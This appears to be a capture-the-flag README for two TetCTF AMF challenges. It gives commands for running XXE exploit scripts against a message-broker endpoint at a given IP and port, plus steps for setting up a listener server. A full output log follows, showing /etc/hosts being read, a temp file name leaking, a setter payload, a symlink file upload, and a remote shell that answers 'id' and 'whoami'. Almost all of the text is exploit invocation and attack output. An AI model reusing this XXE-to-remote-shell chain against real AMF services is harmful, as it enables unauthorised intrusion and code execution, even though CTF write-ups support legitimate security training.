# AMF1

python amf_xxe.py "http://139.162.40.239:1337/tetctf/messagebroker/amf" foo tetctf_v1


# AMF2

## on your server run: 
    python jar_xxe_server.py

### edit the content of payload `trigger_jar_xxe` in `amf_xxe.py` to point to your socket server

python tetctf_exp.py 


    [+] trigger_amf_xxe etc_hosts
    etc_hosts output: 
    127.0.0.1	localhost
    ::1	localhost ip6-localhost ip6-loopback
    fe00::0	ip6-localnet
    ff00::0	ip6-mcastprefix
    ff02::1	ip6-allnodes
    ff02::2	ip6-allrouters
    172.17.0.3	02688b965fbd (No such file or directory)...Bwlb.....
    [+] Done
    [+] trigger_amf_xxe trigger_jar_xxe
    [+] trigger_amf_xxe get_tmp_filename
    get_tmp_filename output: 
    jar_cache7343514775749524690.tmp
    safeToDelete.tmp (No such file or directory)...Bwlb.2...
    [+] Done
    [+] tmp filename: jar_cache7343514775749524690.tmp
    [+] generate_amf_setter_payload
    [+] trigger_setter
    AppendToGatewayUrl,;jsessionid=A9A1197B578F257C267FABA24A88FF87	/onStatus 
    C	coderootCausedetailsmessage#Server.ProcessinThe supplied destination id is not registered with any service.
    [+] upload_via_symlink
    { "serviceResponse":"true", "serviceError":null, "serviceName":"File Upload", "opName":"fileUpload" }
    [+] done, enjoy shell
    /peterjson@remote_shell/~.~
    id

    uid=1000(service) gid=1000(service) groups=1000(service)


    None
    /peterjson@remote_shell/~.~
    whoami       

    service



